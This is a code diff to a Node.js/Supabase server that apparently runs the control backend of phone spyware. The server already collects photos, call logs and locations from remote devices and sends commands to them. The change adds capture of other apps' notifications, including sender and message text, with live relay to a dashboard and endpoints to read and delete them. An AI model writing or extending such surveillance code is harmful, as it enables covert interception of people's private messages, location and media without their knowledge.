@@ -165,6 +165,30 @@ wss.on('connection', (ws, req) => {
           }, { onConflict: 'id' });
           break;
 
+        case 'notification':
+          try {
+            await supabase.from('notifications').insert({
+              device_id: msg.device_id,
+              app_package: msg.app_package,
+              app_name: msg.app_name,
+              sender: msg.sender,
+              message: msg.message,
+              timestamp: msg.timestamp
+            });
+
+            broadcastToDashboard({
+              type: 'notification',
+              device_id: msg.device_id,
+              app_name: msg.app_name,
+              sender: msg.sender,
+              message: msg.message,
+              timestamp: msg.timestamp
+            });
+          } catch (e) {
+            console.error('Notification insert error:', e.message);
+          }
+          break;
+
         case 'response':
           console.log(`Response from ${msg.device_id}: ${msg.command_type} - ${msg.success}`);
 
@@ -333,6 +357,22 @@ app.get('/api/device/:deviceId/photos', async (req, res) => {
   }
 });
 
+app.get('/api/device/:deviceId/notifications', async (req, res) => {
+  try {
+    const { data, error } = await supabase
+      .from('notifications')
+      .select('*')
+      .eq('device_id', req.params.deviceId)
+      .order('created_at', { ascending: false })
+      .limit(200);
+
+    if (error) throw error;
+    res.json(data);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 // ===== DELETE ENDPOINTS =====
 
 app.delete('/api/photos/:photoId', async (req, res) => {
@@ -409,6 +449,24 @@ app.delete('/api/device/:deviceId/locations', async (req, res) => {
   }
 });
 
+app.delete('/api/device/:deviceId/notifications', async (req, res) => {
+  try {
+    await supabase.from('notifications').delete().eq('device_id', req.params.deviceId);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.delete('/api/notifications/:notifId', async (req, res) => {
+  try {
+    await supabase.from('notifications').delete().eq('id', req.params.notifId);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 app.delete('/api/device/:deviceId/commands', async (req, res) => {
   try {
     await supabase.from('commands').delete().eq('device_id', req.params.deviceId);
@@ -435,6 +493,7 @@ app.delete('/api/device/:deviceId', async (req, res) => {
     await supabase.from('call_logs').delete().eq('device_id', id);
     await supabase.from('locations').delete().eq('device_id', id);
     await supabase.from('commands').delete().eq('device_id', id);
+    await supabase.from('notifications').delete().eq('device_id', id);
     await supabase.from('devices').delete().eq('id', id);
 
     res.json({ success: true });
@@ -445,12 +504,13 @@ app.delete('/api/device/:deviceId', async (req, res) => {
 
 app.get('/api/stats', async (req, res) => {
   try {
-    const [devices, photos, callLogs, locations, commands] = await Promise.all([
+    const [devices, photos, callLogs, locations, commands, notifications] = await Promise.all([
       supabase.from('devices').select('id', { count: 'exact', head: true }),
       supabase.from('photos').select('id', { count: 'exact', head: true }),
       supabase.from('call_logs').select('id', { count: 'exact', head: true }),
       supabase.from('locations').select('id', { count: 'exact', head: true }),
       supabase.from('commands').select('id', { count: 'exact', head: true }),
+      supabase.from('notifications').select('id', { count: 'exact', head: true }),
     ]);
 
     res.json({
@@ -458,7 +518,8 @@ app.get('/api/stats', async (req, res) => {
       photos: photos.count || 0,
       call_logs: callLogs.count || 0,
       locations: locations.count || 0,
-      commands: commands.count || 0
+      commands: commands.count || 0,
+      notifications: notifications.count || 0
     });
   } catch (e) {
     res.status(500).json({ error: e.message });
